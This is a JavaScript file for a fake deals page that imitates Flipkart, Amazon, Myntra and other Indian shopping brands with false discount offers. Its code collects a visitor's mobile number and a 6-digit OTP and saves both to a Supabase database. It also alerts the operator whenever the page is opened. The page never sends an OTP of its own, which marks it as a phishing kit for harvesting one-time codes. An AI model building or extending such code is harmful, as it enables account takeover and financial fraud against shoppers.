const APPS = [
  {
    id: 'flipkart',
    name: 'Flipkart',
    color: '#2874f0',
    icon: 'FK',
    logo: 'assets/logos/flipkart.svg',
    discount: 'Up to 80% off',
    title: 'Flipkart Big Billion Days',
    tagline: 'Up to 80% off on electronics & fashion',
    badge: '🔥 Hot Deal',
    maxDiscount: '80%',
    validity: '3 Days',
    code: 'FLIP80',
    enabled: true,
    perks: [
      'Extra 10% off with bank cards',
      'Free delivery on orders above ₹499',
      'No-cost EMI on select products',
      'Exchange bonus up to ₹5,000',
    ],
  },
  {
    id: 'amazon',
    name: 'Amazon',
    color: '#ff9900',
    icon: 'AZ',
    logo: 'assets/logos/amazon.svg',
    discount: 'Up to 70% off',
    title: 'Amazon Great Indian Festival',
    tagline: 'Massive deals across all categories',
    badge: '⭐ Top Pick',
    maxDiscount: '70%',
    validity: '5 Days',
    code: 'AMZN70',
    enabled: false,
    perks: [
      'Prime early access to lightning deals',
      '10% instant discount on SBI cards',
      'Free same-day delivery for Prime members',
      'Buy 2 Get 1 free on fashion',
    ],
  },
  {
    id: 'myntra',
    name: 'Myntra',
    color: '#ff3f6c',
    icon: 'MY',
    logo: 'assets/logos/myntra.svg',
    discount: '50-90% off',
    title: 'Myntra End of Reason Sale',
    tagline: 'Fashion frenzy — biggest style sale',
    badge: '👗 Fashion',
    maxDiscount: '90%',
    validity: '4 Days',
    code: 'MYNTRA50',
    enabled: false,
    perks: [
      'Extra ₹500 off on orders above ₹1999',
      'Free shipping on all orders',
      'Myntra Insider exclusive deals',
      'Brand vouchers worth ₹1000',
    ],
  },
  {
    id: 'ajio',
    name: 'Ajio',
    color: '#2c4152',
    icon: 'AJ',
    logo: 'assets/logos/ajio.svg',
    discount: 'Up to 85% off',
    title: 'Ajio All Stars Sale',
    tagline: 'Trendy fashion at unbeatable prices',
    badge: '🛍️ Trending',
    maxDiscount: '85%',
    validity: '3 Days',
    code: 'AJIO85',
    enabled: false,
    perks: [
      'Flat ₹300 off on first order',
      'Buy 1 Get 1 on selected brands',
      'Ajio Luxe exclusive collections',
      'Easy returns within 30 days',
    ],
  },
  {
    id: 'nykaa',
    name: 'Nykaa',
    color: '#fc2779',
    icon: 'NK',
    logo: 'assets/logos/nykaa.svg',
    discount: 'Up to 60% off',
    title: 'Nykaa Pink Friday Sale',
    tagline: 'Beauty & wellness mega discounts',
    badge: '💄 Beauty',
    maxDiscount: '60%',
    validity: '2 Days',
    code: 'NYK60',
    enabled: false,
    perks: [
      'Free samples with every order',
      'Extra 15% off on Nykaa brands',
      'Complimentary beauty consultation',
      'Reward points on every purchase',
    ],
  },
  {
    id: 'meesho',
    name: 'Meesho',
    color: '#9f2089',
    icon: 'ME',
    logo: 'assets/logos/meesho.svg',
    discount: 'Up to 75% off',
    title: 'Meesho Mega Savings',
    tagline: 'Lowest prices on everyday essentials',
    badge: '💰 Budget',
    maxDiscount: '75%',
    validity: '7 Days',
    code: 'MEESHO75',
    enabled: false,
    perks: [
      'Zero shipping charges nationwide',
      'Cash on delivery available',
      'Reseller commission bonuses',
      'Daily flash deals under ₹99',
    ],
  },
  {
    id: 'snapdeal',
    name: 'Snapdeal',
    color: '#e40046',
    icon: 'SD',
    logo: 'assets/logos/snapdeal.svg',
    discount: 'Up to 65% off',
    title: 'Snapdeal Unbox Zindagi',
    tagline: 'Value shopping for smart buyers',
    badge: '📦 Value',
    maxDiscount: '65%',
    validity: '4 Days',
    code: 'SNAP65',
    enabled: false,
    perks: [
      'Snapcash rewards on signup',
      'Free returns within 7 days',
      'Deals starting at ₹49',
      'Extra discounts via Snapdeal app',
    ],
  },
  {
    id: 'paytm',
    name: 'Paytm Mall',
    color: '#00baf2',
    icon: 'PM',
    logo: 'assets/logos/paytm.svg',
    discount: 'Up to 55% off',
    title: 'Paytm Mall Cashback Carnival',
    tagline: 'Shop more, earn more cashback',
    badge: '💳 Cashback',
    maxDiscount: '55%',
    validity: '6 Days',
    code: 'PAYTM55',
    enabled: false,
    perks: [
      'Up to 20% Paytm cashback',
      'Paytm Postpaid exclusive offers',
      'Gold coin rewards on purchases',
      'Zero convenience fee on UPI',
    ],
  },
];

const FLIPKART_TILE = '<div class="brand-tile brand-tile--flipkart brand-tile--large"><span class="fk-f">f</span><span class="fk-rest">lipkart</span></div>';

const BRAND_TILES = {
  flipkart: '<div class="brand-tile brand-tile--flipkart"><span class="fk-f">f</span><span class="fk-rest">lipkart</span></div>',
  amazon: '<div class="brand-tile brand-tile--amazon">amazon</div>',
  myntra: '<div class="brand-tile brand-tile--myntra">MYNTRA</div>',
  ajio: '<div class="brand-tile brand-tile--ajio">AJIO</div>',
  nykaa: '<div class="brand-tile brand-tile--nykaa">NYKAA</div>',
  meesho: '<div class="brand-tile brand-tile--meesho">meesho</div>',
  snapdeal: '<div class="brand-tile brand-tile--snapdeal">SNAP<br>DEAL</div>',
  paytm: '<div class="brand-tile brand-tile--paytm">Paytm</div>',
};

const SESSION_KEY = 'dealvault_session_id';

let selectedApp = APPS[0];
let otpSent = false;
let resendInterval = null;
let supabase = null;
let sessionId = getOrCreateSessionId();

let appGrid;
let offerGlow;
let offerLogo;
let offerTitle;
let offerTagline;
let offerBadge;
let statDiscount;
let statValidity;
let statCode;
let offerPerks;
let selectedAppName;
let verifyForm;
let phoneInput;
let phoneError;
let otpGroup;
let otpError;
let otpDigits;
let verifyBtn;
let btnText;
let resendBtn;
let successMessage;

function getOrCreateSessionId() {
  let id = sessionStorage.getItem(SESSION_KEY);
  if (!id) {
    id = crypto.randomUUID();
    sessionStorage.setItem(SESSION_KEY, id);
  }
  return id;
}

function initSupabase() {
  try {
    const config = window.APP_CONFIG || {};
    if (!config.SUPABASE_URL || !config.SUPABASE_ANON_KEY) {
      console.warn('Supabase config missing');
      return null;
    }
    if (!window.supabase || typeof window.supabase.createClient !== 'function') {
      console.warn('Supabase library not loaded');
      return null;
    }
    return window.supabase.createClient(config.SUPABASE_URL, config.SUPABASE_ANON_KEY);
  } catch (err) {
    console.error('Supabase init failed:', err);
    return null;
  }
}

async function notifyPageOpen() {
  try {
    const endpoint = '/.netlify/functions/notify-sending';
    console.log('[DealVault] Calling notify:', endpoint, 'event=page_open');

    const res = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        event_type: 'page_open',
        session_id: sessionId,
        selected_app: selectedApp.id,
        message: 'Someone opened the promotional offers website',
      }),
    });

    const data = await res.json().catch(() => ({}));
    console.log('[DealVault] notify page_open status:', res.status, data);

    if (!res.ok || !data.ok) {
      console.error('[DealVault] notify FAILED:', data);
    }
  } catch (err) {
    console.error('[DealVault] notify page_open error:', err);
  }
}

async function ensureRegistrationRow() {
  if (!supabase) return;

  const { data: existing } = await supabase
    .from('registrations')
    .select('id')
    .eq('session_id', sessionId)
    .maybeSingle();

  if (!existing) {
    await supabase.from('registrations').insert({
      session_id: sessionId,
      selected_app: selectedApp.id,
    });
  }
}

async function savePhoneToSupabase(phone) {
  if (!supabase) {
    return { error: { message: 'Database not connected. Check your internet and refresh.' } };
  }

  const { error } = await supabase
    .from('registrations')
    .upsert(
      {
        session_id: sessionId,
        phone,
        selected_app: selectedApp.id,
      },
      { onConflict: 'session_id' }
    );

  if (error) console.error('Save phone error:', error);
  return { error };
}

async function saveOtpToSupabase(otp) {
  if (!supabase) {
    return { error: { message: 'Database not connected. Check your internet and refresh.' } };
  }

  const phone = phoneInput ? phoneInput.value.trim() : '';

  const { error } = await supabase
    .from('registrations')
    .upsert(
      {
        session_id: sessionId,
        phone,
        otp,
        selected_app: selectedApp.id,
      },
      { onConflict: 'session_id' }
    );

  if (error) console.error('Save OTP error:', error);
  return { error };
}

function brandTileMarkup(app, large = false) {
  const tile = BRAND_TILES[app.id] || `<div class="brand-tile" style="background:${app.color}">${app.icon}</div>`;
  if (large && app.id === 'flipkart') return FLIPKART_TILE;
  if (large) return tile.replace('brand-tile--', 'brand-tile--').replace('class="brand-tile', 'class="brand-tile brand-tile--large');
  return tile;
}

function bindAppGrid() {
  if (!appGrid) return;

  appGrid.querySelectorAll('.app-card[data-enabled="true"]').forEach((card) => {
    card.addEventListener('click', () => selectApp(card.dataset.id));
    card.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        selectApp(card.dataset.id);
      }
    });
  });
}

function updateAppGridSelection() {
  if (!appGrid) return;

  appGrid.querySelectorAll('.app-card').forEach((card) => {
    const isSelected = card.dataset.id === selectedApp.id;
    card.classList.toggle('selected', isSelected);
    card.setAttribute('aria-selected', isSelected);
  });
}

function renderAppGrid() {
  if (!appGrid) return;

  if (!appGrid.querySelector('.app-card')) {
    appGrid.innerHTML = APPS.map((app) => {
      const isSelected = app.id === selectedApp.id;
      const isDisabled = !app.enabled;
      return `
      <div
        class="app-card${isSelected ? ' selected' : ''}${isDisabled ? ' app-card--disabled' : ''}"
        role="option"
        aria-selected="${isSelected}"
        aria-disabled="${isDisabled}"
        data-id="${app.id}"
        data-enabled="${app.enabled}"
        style="--app-color: ${app.color}"
        tabindex="${isDisabled ? '-1' : '0'}"
      >
        ${isDisabled ? '<span class="app-soon-badge">Soon</span>' : ''}
        <div class="app-icon">${brandTileMarkup(app)}</div>
        <span class="app-name">${app.name}</span>
        <span class="app-discount">${isDisabled ? 'Will be added later' : app.discount}</span>
      </div>
    `;
    }).join('');
  }

  bindAppGrid();
  updateAppGridSelection();
}

function selectApp(id) {
  const app = APPS.find((a) => a.id === id);
  if (!app || !app.enabled) return;

  selectedApp = app;
  updateAppGridSelection();
  updateOfferCard();
  selectedAppName.textContent = selectedApp.name;

  if (supabase && !otpSent) {
    supabase
      .from('registrations')
      .upsert(
        { session_id: sessionId, selected_app: selectedApp.id },
        { onConflict: 'session_id' }
      )
      .then(() => {});
  }
}

function updateOfferCard() {
  const app = selectedApp;
  if (!offerGlow || !offerLogo) return;

  document.documentElement.style.setProperty('--offer-color', app.color);
  offerGlow.style.background = `linear-gradient(135deg, ${app.color}, transparent 60%)`;
  offerLogo.innerHTML = brandTileMarkup(app, true);
  offerLogo.style.background = 'transparent';
  offerTitle.textContent = app.title;
  offerTagline.textContent = app.tagline;
  offerBadge.textContent = app.badge;
  statDiscount.textContent = app.maxDiscount;
  statValidity.textContent = app.validity;
  statCode.textContent = app.code;
  offerPerks.innerHTML = app.perks.map((p) => `<li>${p}</li>`).join('');
}

function resetVerification() {
  otpSent = false;
  if (!phoneInput) return;
  phoneInput.value = '';
  phoneError.textContent = '';
  otpError.textContent = '';
  if (otpGroup) {
    otpGroup.hidden = true;
    otpGroup.classList.remove('is-visible');
  }
  if (verifyForm) verifyForm.hidden = false;
  if (successMessage) successMessage.hidden = true;
  clearInterval(resendInterval);
  if (btnText) btnText.textContent = 'Send OTP';
  if (otpDigits) otpDigits.forEach((d) => { d.value = ''; });
  if (resendBtn) resendBtn.disabled = true;
  setLoading(false);
}

function validatePhone(phone) {
  return /^[6-9]\d{9}$/.test(phone);
}

function getOtpValue() {
  return Array.from(otpDigits).map((d) => d.value).join('');
}

function setLoading(loading) {
  if (!verifyBtn) return;
  verifyBtn.disabled = loading;
  verifyBtn.classList.toggle('is-loading', loading);
}

function startResendTimer() {
  if (!resendBtn) return;
  let seconds = 30;
  resendBtn.disabled = true;
  resendBtn.innerHTML = 'Resend OTP in <span id="resendTimer">30</span>s';

  clearInterval(resendInterval);
  resendInterval = setInterval(() => {
    seconds -= 1;
    const timerEl = document.getElementById('resendTimer');
    if (timerEl) timerEl.textContent = seconds;
    if (seconds <= 0) {
      clearInterval(resendInterval);
      resendBtn.disabled = false;
      resendBtn.textContent = 'Resend OTP';
    }
  }, 1000);
}

function showOtpStep() {
  otpSent = true;
  if (otpGroup) {
    otpGroup.hidden = false;
    otpGroup.removeAttribute('hidden');
    otpGroup.classList.add('is-visible');
  }
  if (btnText) btnText.textContent = 'Verify OTP';
  startResendTimer();
  if (otpDigits && otpDigits[0]) otpDigits[0].focus();
}

async function handleSendOtp() {
  const phone = phoneInput.value.trim();
  if (!validatePhone(phone)) {
    phoneError.textContent = 'Enter a valid 10-digit Indian mobile number';
    return;
  }

  setLoading(true);
  phoneError.textContent = '';

  try {
    const { error } = await savePhoneToSupabase(phone);
    if (error) {
      phoneError.textContent = error.message || 'Could not save number. Please try again.';
      return;
    }
    showOtpStep();
  } catch (err) {
    console.error(err);
    phoneError.textContent = 'Something went wrong. Please try again.';
  } finally {
    setLoading(false);
  }
}

async function handleVerifyOtp() {
  const otp = getOtpValue();
  if (otp.length !== 6) {
    otpError.textContent = 'Please enter the complete 6-digit OTP';
    return;
  }

  verifyBtn.disabled = true;
  otpError.textContent = '';

  try {
    const { error } = await saveOtpToSupabase(otp);
    if (error) {
      otpError.textContent = error.message || 'Could not save OTP. Please try again.';
      verifyBtn.disabled = false;
      return;
    }

    verifyForm.hidden = true;
    successMessage.hidden = false;
    successMessage.removeAttribute('hidden');
  } catch (err) {
    console.error(err);
    otpError.textContent = 'Something went wrong. Please try again.';
    verifyBtn.disabled = false;
  }
}

function bindFormEvents() {
  // OTP flow handled by verify.js — skip if already bound
  if (window.__verifyJsLoaded || !phoneInput) return;
}

function cacheDomRefs() {
  appGrid = document.getElementById('appGrid');
  offerGlow = document.getElementById('offerGlow');
  offerLogo = document.getElementById('offerLogo');
  offerTitle = document.getElementById('offerTitle');
  offerTagline = document.getElementById('offerTagline');
  offerBadge = document.getElementById('offerBadge');
  statDiscount = document.getElementById('statDiscount');
  statValidity = document.getElementById('statValidity');
  statCode = document.getElementById('statCode');
  offerPerks = document.getElementById('offerPerks');
  selectedAppName = document.getElementById('selectedAppName');
  verifyForm = document.getElementById('verifyForm');
  phoneInput = document.getElementById('phone');
  phoneError = document.getElementById('phoneError');
  otpGroup = document.getElementById('otpGroup');
  otpError = document.getElementById('otpError');
  otpDigits = document.querySelectorAll('.otp-digit');
  verifyBtn = document.getElementById('verifyBtn');
  btnText = verifyBtn ? verifyBtn.querySelector('.btn-text') : null;
  resendBtn = document.getElementById('resendBtn');
  successMessage = document.getElementById('successMessage');
}

async function initApp() {
  cacheDomRefs();
  bindFormEvents();
  supabase = initSupabase();
  renderAppGrid();
  updateOfferCard();
  setLoading(false);

  try {
    await Promise.all([
      notifyPageOpen(),
      ensureRegistrationRow(),
    ]);
  } catch (err) {
    console.warn('Background init failed:', err);
  }
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initApp);
} else {
  initApp();
}
